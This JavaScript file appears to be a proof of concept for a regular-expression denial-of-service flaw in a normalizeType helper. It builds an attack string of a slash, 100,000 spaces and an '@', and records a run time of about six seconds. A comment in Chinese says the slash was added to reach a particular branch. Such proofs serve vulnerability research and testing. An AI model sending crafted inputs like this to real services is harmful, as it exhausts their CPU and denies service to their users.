const { normalizeType } = require("./utils.js");

//Attack String :""+" "*100000+"@"
var str = "/";
for (var i = 0; i < 100000; i++) {
  str += " ";
}
str += "@";

var result = normalizeType(str);

// real    0m6.279s
// user    0m6.264s
// sys     0m0.000s

//为进入指定分支修改了攻击串(在串开头增加/)
